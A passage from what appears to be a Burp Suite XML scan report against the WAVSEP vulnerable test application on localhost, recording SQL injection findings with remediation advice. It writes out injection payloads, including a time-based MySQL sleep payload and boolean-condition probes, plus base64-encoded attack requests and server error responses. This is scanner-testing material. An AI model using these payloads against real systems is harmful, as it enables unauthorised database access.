XBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNCAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7637283303759909888</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>43520622 or 8895=08895</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMSc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkzNg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo1NCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAxLTAxJiMzOTsmIzM5OyBBTkQgdXNlcklkPTEmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMScn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjU0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MDkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMTQzNTIwNjIyJTIwb3IlMjA4ODk1JTNkMDg4OTU=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDc5Nw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0ODoxNSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICYjMzk7MjAxMC0wMS0wMTQzNTIwNjIyIG9yIDg4OTU9MDg4OTUmIzM5OzwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmIn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjE0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7286000394475234304</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>25229716 or 1949=01949</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
